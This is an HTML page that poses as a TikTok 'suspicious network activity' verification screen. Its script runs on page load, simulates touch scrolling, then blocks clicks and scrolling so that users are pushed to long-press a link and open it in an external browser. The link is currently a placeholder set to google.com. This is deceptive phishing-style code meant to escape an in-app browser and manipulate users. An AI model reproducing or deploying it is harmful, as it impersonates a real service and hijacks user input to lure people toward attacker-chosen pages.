<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; background: #ffffff; 
            height: 300vh; overscroll-behavior-y: none; 
            -webkit-font-smoothing: antialiased;
        }
        
        #top-block { height: 600px; background: #ffffff; width: 100%; } 

        #main-content { 
            position: relative;
            text-align: center; 
            font-family: "Proxima Nova", "Inter", "Segoe UI", Roboto, sans-serif;
            padding: 0 25px; 
            margin-top: 110px;
        }

        .verification-icon {
            width: 65px; height: 65px; margin-bottom: 15px;
        }

        .header {
            color: #161823; font-size: 22px; font-weight: 700;
            margin-bottom: 10px; line-height: 1.2;
        }

        .subtext {
            color: #8A8B91; font-size: 16px; line-height: 1.5;
            margin-bottom: 20px; max-width: 90%;
            margin-left: auto; margin-right: auto;
        }

        .instruction-list {
            display: inline-block;
            text-align: left;
            color: #8A8B91;
            font-size: 15px;
            margin-bottom: 65px; /* Deep spacing to separate link */
            padding-left: 20px;
            line-height: 1.8;
        }

        .instruction-list li {
            margin-bottom: 5px;
        }

        #breakout-link {
            color: #0049f6; text-decoration: underline;
            font-size: 17px; word-break: break-all;
            display: inline-block; 
            z-index: 10000;
            position: relative; -webkit-tap-highlight-color: transparent;
        }

        #shield { 
            display: none; position: fixed; 
            top: 0; left: 0; width: 100%; height: 100%; 
            z-index: 5000; pointer-events: none; 
        }
    </style>
</head>
<body>
    <div id="shield"></div>
    <div id="top-block"></div>

    <div id="main-content">
        <svg class="verification-icon" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
        </svg>

        <div class="header">Suspicious network activity</div>
        <div class="subtext">Weâ€™ve detected unusual activity from your network. Please complete the verification to continue using TikTok.</div>

        <ul class="instruction-list">
            <li>hold the link</li>
            <li>press "open link" in external browser</li>
            <li>press the verify button 5 times to complete verification</li>
        </ul>

        <br>
        <a id="breakout-link" href="https://www.google.com">https://www.google.com</a>
    </div>

    <script>
        function createTouchEvent(type, y) {
            return new TouchEvent(type, {
                bubbles: true, cancelable: true,
                touches: [new Touch({ identifier: Date.now(), target: document.body, clientY: y, screenY: y, pageY: y })]
            });
        }

        async function runVerifiedHijack() {
            const startY = 900, endY = 100, steps = 20, stepDelay = 12;
            document.body.dispatchEvent(createTouchEvent('touchstart', startY));
            for (let i = 0; i <= steps; i++) {
                const currentY = startY - ((startY - endY) * (i / steps));
                document.body.dispatchEvent(createTouchEvent('touchmove', currentY));
                window.scrollTo(0, (600 * (i / steps)));
                await new Promise(r => setTimeout(r, stepDelay));
            }
            document.body.dispatchEvent(createTouchEvent('touchend', endY));
            engageLock();
        }

        function engageLock() {
            document.getElementById('shield').style.display = 'block';
            const link = document.getElementById('breakout-link');
            link.addEventListener('click', (e) => e.preventDefault(), { capture: true });
            link.addEventListener('touchend', (e) => e.preventDefault(), { passive: false });

            const prevent = (e) => { 
                if (e.target.id === 'breakout-link' && e.type === 'touchstart') return;
                e.preventDefault(); 
                e.stopPropagation(); 
            };
            ['touchstart', 'touchmove', 'wheel'].forEach(ev => {
                window.addEventListener(ev, prevent, { passive: false, capture: true });
            });
        }

        window.onload = () => { setTimeout(runVerifiedHijack, 150); };
    </script>
</body>
</html>
